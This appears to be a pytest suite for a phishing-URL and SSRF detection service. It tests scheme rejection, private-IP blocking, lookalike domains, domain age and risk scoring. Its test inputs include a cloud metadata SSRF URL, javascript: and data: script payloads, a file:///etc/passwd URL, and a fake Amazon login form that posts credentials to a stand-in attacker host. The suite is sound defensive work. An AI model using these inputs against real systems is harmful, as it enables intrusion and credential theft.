"""
tests/test_url_intelligence_complete.py

PHASE 5 — COMPLETE URL & DOMAIN THREAT ANALYSIS TEST SUITE (PS #2)

Validates:
1. Legitimate vs Typosquat vs Homoglyph URL Normalization & Scheme Validation
2. Rejection of dangerous URL schemes (javascript:, data:, file:, ftp:, blob:)
3. SSRF Guard Blocking: Private IPs, IPv6 loopback, cloud metadata endpoints (169.254.169.254)
4. Multi-hop Redirect Chain Tracing & Redirect Loop Detection
5. Domain Registration Intelligence & Age Classification (VERY_NEW, RECENT, ESTABLISHED, UNKNOWN)
6. Static Credential Landing Page Analysis & Form Action Inspection
7. Transparent Domain Risk Score Calculation & Weight Breakdown
"""

import pytest
from unittest.mock import patch, MagicMock
from services.redirect_tracer import validate_target_ssrf_safety, trace_safe_redirect_chain, is_ip_private_or_restricted
from services.url_intelligence import (
    normalize_and_analyze_url,
    get_lookalike_analysis,
    get_domain_registration_intelligence,
    detect_credential_page,
    calculate_domain_risk_model,
    analyze_url_intelligence
)


def test_ssrf_guard_blocks_private_ips_and_metadata():
    """
    Verifies SSRF guard blocks loopback, RFC1918 private IPs, and cloud metadata endpoints.
    """
    assert is_ip_private_or_restricted("127.0.0.1") is True
    assert is_ip_private_or_restricted("10.0.0.1") is True
    assert is_ip_private_or_restricted("192.168.1.50") is True
    assert is_ip_private_or_restricted("169.254.169.254") is True
    assert is_ip_private_or_restricted("::1") is True

    safe_ip, reason_ip, _ = validate_target_ssrf_safety("http://169.254.169.254/latest/meta-data/")
    assert safe_ip is False
    assert "private/restricted" in reason_ip or "SSRF" in reason_ip or "restricted IP" in reason_ip

    safe_local, reason_local, _ = validate_target_ssrf_safety("http://127.0.0.1:8000/admin")
    assert safe_local is False


def test_unsupported_scheme_rejection():
    """
    Verifies dangerous non-HTTP URL schemes are rejected.
    """
    norm_js = normalize_and_analyze_url("javascript:alert(1)")
    assert norm_js["is_valid"] is False
    assert "rejected_unsupported_scheme" in norm_js["obfuscation_signals"]

    norm_data = normalize_and_analyze_url("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")
    assert norm_data["is_valid"] is False

    norm_file = normalize_and_analyze_url("file:///etc/passwd")
    assert norm_file["is_valid"] is False


def test_url_normalization_obfuscation_signals():
    """
    Verifies URL normalization detects IP hostnames, excessive subdomains, non-standard ports, and punycode.
    """
    norm_ip = normalize_and_analyze_url("http://192.0.2.1:8080/login.html")
    assert norm_ip["is_valid"] is True
    assert norm_ip["is_ip"] is True
    assert "ip_based_hostname" in norm_ip["obfuscation_signals"]

    norm_sub = normalize_and_analyze_url("http://a.b.c.d.e.amazon-security.example/login")
    assert "excessive_subdomain_depth" in norm_sub["obfuscation_signals"]

    norm_puny = normalize_and_analyze_url("http://xn--amazn-epa.com/login")
    assert "punycode_homoglyph_indicator" in norm_puny["obfuscation_signals"]


def test_lookalike_analysis_formatting():
    """
    Verifies lookalike domain analysis outputs exact specified schema.
    """
    look = get_lookalike_analysis("amaz0n-security-login.xyz", official_domain="amazon.com")
    assert "candidate" in look
    cand = look["candidate"]
    assert "domain" in cand
    assert "official_domain" in cand
    assert "similarity" in cand
    assert "fuzzer_type" in cand
    assert "punycode" in cand
    assert "resolves" in cand
    assert "risk" in cand


@patch("services.url_intelligence.fetch_rdap_data")
def test_domain_registration_intelligence_age_classification(mock_rdap):
    """
    Verifies domain age classification: VERY_NEW (<30d), RECENT (30-180d), ESTABLISHED (>180d), UNKNOWN.
    """
    # VERY_NEW domain (< 30 days)
    mock_rdap.return_value = {
        "status": "RDAP_SUCCESS",
        "creation_date": "2026-09-01T00:00:00Z",
        "registrar": "NameCheap Inc."
    }
    reg_new = get_domain_registration_intelligence("very-new-phish.xyz")
    assert reg_new["classification"] == "VERY_NEW"
    assert reg_new["risk_points"] == 30

    # ESTABLISHED domain (> 180 days)
    mock_rdap.return_value = {
        "status": "RDAP_SUCCESS",
        "creation_date": "2010-01-01T00:00:00Z",
        "registrar": "MarkMonitor"
    }
    reg_old = get_domain_registration_intelligence("amazon.com")
    assert reg_old["classification"] == "ESTABLISHED"
    assert reg_old["risk_points"] == 0

    # UNAVAILABLE RDAP
    mock_rdap.return_value = {
        "status": "RDAP_UNAVAILABLE",
        "creation_date": "Unavailable",
        "registrar": "Unavailable"
    }
    reg_unavail = get_domain_registration_intelligence("unknown-rdap.example")
    assert reg_unavail["classification"] == "UNKNOWN"
    assert reg_unavail["status"] == "RDAP_UNAVAILABLE"


def test_detect_credential_landing_page():
    """
    Verifies static HTML parsing detects password inputs, login forms, and cross-domain form actions.
    """
    html = """
    <html>
      <body>
        <h2>Sign in to Amazon Corporate Portal</h2>
        <form action="https://attacker-stealer-server.xyz/harvest">
          <input type="email" name="username" placeholder="Email">
          <input type="password" name="password" placeholder="Password">
          <button type="submit">Sign In</button>
        </form>
      </body>
    </html>
    """

    res = detect_credential_page("https://amaz0n-security-login.xyz/login.html", html_content=html)
    assert res["credential_page"] is True
    assert res["password_input"] is True
    assert res["login_form"] is True
    assert "password_input_detected" in res["credential_indicators"]
    assert "cross_domain_form_action" in res["credential_indicators"]
    assert "attacker-stealer-server.xyz" in res["form_action_domains"]


def test_transparent_domain_risk_model():
    """
    Verifies non-double-counted weight breakdown in domain risk model.
    """
    norm = {"risk_score": 15}
    lookalike = {"is_lookalike": True}
    registration = {"risk_points": 30}
    redirect = {"signals": ["MULTI_HOP_REDIRECT", "CROSS_DOMAIN_REDIRECT"]}
    cred_page = {"risk_points": 35}
    dns = {"resolved_ips": ["93.184.216.34"]}

    model = calculate_domain_risk_model(norm, lookalike, registration, redirect, cred_page, dns)
    assert model["domain_similarity"] == 30
    assert model["registration"] == 30
    assert model["redirect"] == 25
    assert model["credential_page"] == 35
    assert model["infrastructure"] == 15
    assert model["total"] == 100


@patch("services.redirect_tracer.validate_target_ssrf_safety")
def test_full_url_intelligence_pipeline(mock_ssrf_safety):
    """
    Verifies end-to-end analyze_url_intelligence pipeline output structure.
    """
    mock_ssrf_safety.return_value = (True, "Public IP safe", "93.184.216.34")

    res = analyze_url_intelligence("https://amaz0n-security-login.xyz/auth/login", official_domain="amazon.com", brand="Amazon")
    assert "original_url" in res
    assert "canonical_url" in res
    assert "final_url" in res
    assert "url_risk" in res
    assert "risk_breakdown" in res
    assert "lookalike_analysis" in res
    assert "registration" in res
    assert "dns" in res
    assert "redirect_chain" in res
    assert "credential_page" in res
    assert "provenance" in res

    assert res["provenance"]["source"] == "url_intelligence_engine"
    assert res["provenance"]["live"] is True
